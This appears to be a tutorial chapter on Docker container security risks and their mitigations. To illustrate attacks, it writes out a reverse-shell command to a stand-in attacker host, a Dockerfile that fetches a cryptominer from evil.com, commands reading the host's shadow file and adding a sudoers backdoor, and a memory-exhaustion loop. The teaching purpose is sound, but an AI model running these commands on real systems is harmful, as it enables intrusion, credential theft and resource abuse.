# Security Risks

## Docker is NOT a Security Tool

**Critical Understanding:**
- Docker packages applications
- Docker does NOT secure applications
- Security must be implemented separately
- Defaults are often insecure

---

## Risk 1: Running as Root

### The Problem

**Default behavior:**
```dockerfile
FROM ubuntu:22.04
# Container runs as root by default
```

**In container:**
```bash
$ whoami
root  # UID 0 - Full privileges!
```

**Why it's dangerous:**
- Attacker exploits app → Gets root access
- Root in container can escape to host
- Can modify critical files
- Can install malware

### Real Attack Scenario

**Vulnerable Container:**
```bash
docker run -d --name webapp nginx:latest
# Runs as root
```

**Attack:**
```bash
# 1. Attacker finds RCE vulnerability
curl http://victim.com/exploit?cmd=whoami
# Output: root

# 2. Attacker gets shell access
curl http://victim.com/exploit?cmd=$(nc -e /bin/bash attacker.com 4444)

# 3. Inside container as root
$ whoami
root

# 4. Check host access
$ ls /proc/1/root
# Can see host filesystem!

# 5. Escape to host (if misconfigured)
$ mkdir /host
$ mount /dev/sda1 /host
$ cat /host/etc/shadow
# Host system compromised!
```

### The Fix

```dockerfile
FROM ubuntu:22.04

# Create non-root user
RUN groupadd -r appuser && \
    useradd -r -g appuser appuser

# Install as root
RUN apt-get update && apt-get install -y curl

# Switch to non-root
USER appuser

# App runs as appuser now
CMD ["./app"]
```

**Verification:**
```bash
docker run --rm myapp whoami
# Output: appuser (not root!)
```

---

## Risk 2: Public Image Trust

### The Problem

**Question:** What's inside this image?

```bash
docker pull randomuser/cool-app:latest
```

**You don't know:**
- Source of the code
- Who built it
- What modifications were made
- Hidden malware
- Backdoors

### Attack Example: Cryptominer

**Malicious Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app

# Legitimate looking
COPY package.json .
RUN npm install

# Hidden cryptominer
RUN curl -s https://evil.com/miner -o /usr/bin/miner && \
    chmod +x /usr/bin/miner && \
    echo "*/5 * * * * /usr/bin/miner > /dev/null 2>&1" | crontab -

COPY . .
CMD ["node", "server.js"]
```

**Impact:**
- Cryptominer runs every 5 minutes
- Steals CPU resources
- Increases costs
- Slows down services
- Potential data exfiltration

### How to Verify Images

**1. Use Official Images:**
```bash
# Good - Official
FROM python:3.9

# Bad - Unknown source
FROM randomuser/python:3.9
```

**2. Scan Before Use:**
```bash
# Scan for vulnerabilities
trivy image nginx:latest

# Scan for malware
docker scan nginx:latest
```

**3. Inspect Layers:**
```bash
# Check what's inside
docker history nginx:latest --no-trunc

# Look for suspicious commands
```

**4. Verify Signatures:**
```bash
# Enable content trust
export DOCKER_CONTENT_TRUST=1
docker pull nginx:latest
# Fails if not signed
```

---

## Risk 3: Shared Kernel

### Container vs VM Security

**Virtual Machine:**
```
App1       App2       App3
OS1        OS2        OS3
Hypervisor
Host Kernel  ← Isolated
Hardware
```

**Container:**
```
App1  App2  App3
Docker Engine
Host Kernel      ← SHARED!
Hardware
```

**Problem:** Kernel vulnerability affects ALL containers.

### Attack: Kernel Exploitation

**Scenario:** Kernel bug CVE-2022-0847 (Dirty Pipe)

```bash
# Exploit in one container
./dirty-pipe-exploit

# Gains root on HOST system
# All containers compromised
# Host system compromised
```

**Impact:**
- Container escape
- Full host access
- Other containers compromised
- Data breach

### Mitigation

**1. Keep Kernel Updated:**
```bash
# Check kernel version
uname -r

# Update regularly
sudo apt-get update && sudo apt-get upgrade
```

**2. Use Security Modules:**
```bash
# AppArmor
docker run --security-opt apparmor=docker-default myapp

# SELinux
docker run --security-opt label=type:container_t myapp
```

**3. Apply Seccomp Profiles:**
```bash
# Restrict system calls
docker run --security-opt seccomp=profile.json myapp
```

---

## Risk 4: Secrets in Images

### The Problem

**Common mistake:**
```dockerfile
FROM python:3.9

# Hardcoded credentials
ENV DB_PASSWORD=supersecret123
ENV API_KEY=sk_live_1234567890

# Stored in image
COPY .env /app/
```

**Why it's dangerous:**

```bash
# Anyone can extract secrets
docker pull mycompany/app:latest

# Method 1: Environment variables
docker inspect mycompany/app:latest | grep -i password

# Method 2: Layer extraction
docker save mycompany/app:latest -o app.tar
tar -xf app.tar
find . -name ".env"
cat ./.../app/.env
# DB_PASSWORD=supersecret123
```

### Real Attack Chain

**1. Image Published:**
```bash
docker push mycompany/app:v1.0
# Contains .env file
```

**2. Attacker Downloads:**
```bash
docker pull mycompany/app:v1.0
```

**3. Extract Secrets:**
```bash
docker save mycompany/app:v1.0 -o app.tar
tar -xf app.tar
grep -r "password" .
# Found: DB_PASSWORD=production_password
#        API_KEY=sk_live_real_key
```

**4. Access Production:**
```bash
mysql -h prod-db.company.com -u admin -p
# Enter password: production_password
# Access granted!
```

### Secure Alternatives

**1. Runtime Environment Variables:**
```dockerfile
# Dockerfile - No secrets
FROM python:3.9
COPY app.py .
CMD ["python", "app.py"]
```

```bash
# Provide at runtime
docker run -e DB_PASSWORD=secret myapp
```

**2. Docker Secrets:**
```bash
# Create secret
echo "my-password" | docker secret create db_password -

# Use secret
docker service create --secret db_password myapp
```

**3. External Secrets Manager:**
```python
# app.py
import boto3

# Fetch from AWS Secrets Manager
client = boto3.client('secretsmanager')
secret = client.get_secret_value(SecretId='prod/db/password')
password = secret['SecretString']
```

---

## Risk 5: Privileged Containers

### The Problem

**Privileged mode:**
```bash
docker run --privileged myapp
```

**What it means:**
- Full access to host devices
- Can load kernel modules
- Can modify host
- **Container = Root on host**

### Attack Example

```bash
# Run privileged container
docker run --privileged -it ubuntu bash

# Inside container - full host access
$ fdisk -l
# Can see ALL host disks

$ mkdir /mnt/host
$ mount /dev/sda1 /mnt/host

$ ls /mnt/host
# Full host filesystem!

$ cat /mnt/host/etc/shadow
# Host credentials exposed

$ echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /mnt/host/etc/sudoers
# Added backdoor to host
```

**Impact:** Complete host compromise.

### Never Use Privileged Mode

**Unless absolutely necessary (rare cases like Docker-in-Docker).**

**Alternatives:**
```bash
# Add specific capabilities instead
docker run --cap-add=NET_ADMIN myapp

# Not everything
docker run --privileged myapp  # DANGER!
```

---

## Risk 6: Volume Mounts

### Dangerous Mount

```bash
# Mounting host root
docker run -v /:/host ubuntu
```

**Inside container:**
```bash
$ ls /host
# Entire host filesystem accessible!

$ cat /host/etc/shadow
$ rm -rf /host/important-data
```

### Safe Mounting

```bash
# Mount only what's needed
docker run -v /app/data:/data:ro myapp
#                            ↑
#                         read-only
```

---

## Risk 7: Resource Exhaustion

### Attack: CPU/Memory Bomb

**Malicious code:**
```python
# Consumes all memory
while True:
    data = [0] * 10**9
    time.sleep(0.1)
```

**Without limits:**
```bash
docker run malicious-app
# Consumes all host memory
# Host crashes
# All services down
```

### Protection: Resource Limits

```bash
docker run \
  --memory="512m" \
  --cpus="1.0" \
  myapp
```

**Kubernetes:**
```yaml
resources:
  limits:
    memory: "512Mi"
    cpu: "500m"
  requests:
    memory: "256Mi"
    cpu: "250m"
```

---

## Summary of Risks

| Risk | Impact | Mitigation |
|------|--------|------------|
| Root user | Container escape | Run as non-root |
| Untrusted images | Malware, backdoors | Scan images, use official |
| Shared kernel | All containers affected | Update kernel, use security modules |
| Secrets in images | Credential theft | Use runtime secrets |
| Privileged mode | Host compromise | Never use (or minimal caps) |
| Volume mounts | Host access | Mount minimal, read-only |
| No resource limits | DoS attack | Set CPU/memory limits |

---

## Quick Security Checklist

**Before Deploying:**
- [ ] Container runs as non-root
- [ ] No secrets in Dockerfile or layers
- [ ] Image scanned for vulnerabilities
- [ ] Using official or verified base images
- [ ] No privileged mode
- [ ] Resource limits set
- [ ] Minimal volume mounts (read-only when possible)
- [ ] Network policies configured

**Next:** Learn security best practices to prevent these risks.
